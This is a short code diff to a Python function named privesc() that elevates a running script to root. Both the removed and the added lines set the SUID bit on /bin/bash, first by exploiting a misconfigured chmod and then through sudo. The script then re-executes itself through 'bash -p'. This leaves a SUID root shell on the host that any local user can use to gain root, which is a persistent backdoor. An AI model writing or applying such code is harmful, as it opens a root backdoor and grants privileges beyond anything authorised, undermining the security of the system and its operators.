@@ -51,14 +51,12 @@ def privesc():
     if os.geteuid() != 0:
         print("Elevating to root using misconfigured chmod...")
         try:
-            # 1. Exploit: Use misconfigured chmod to set SUID bit on /bin/bash
-            subprocess.run(["/usr/bin/chmod", "+s", "/bin/bash"], check=True)
-            print("[+] Successfully set SUID on /bin/bash")
+            # 1. Use sudo to set the SUID bit on bash
+            subprocess.run(["sudo", "/usr/bin/chmod", "+s", "/bin/bash"], check=True)
+            print("[+] Successfully set SUID on /bin/bash using sudo")
             
-            # 2. Restart the server as root.
-            # We use os.execv to replace the current process.
-            # We call our new SUID bash with the '-p' (privileged) flag, 
-            # and tell it to execute this exact Python script.
+            # 2. Replace the current process with a privileged bash process
+            # bash -p is required to prevent bash from dropping the SUID root privileges
             os.execv("/bin/bash", ["bash", "-p", "-c", f"{sys.executable} {THIS_FILE}"])
             
         except Exception as e:
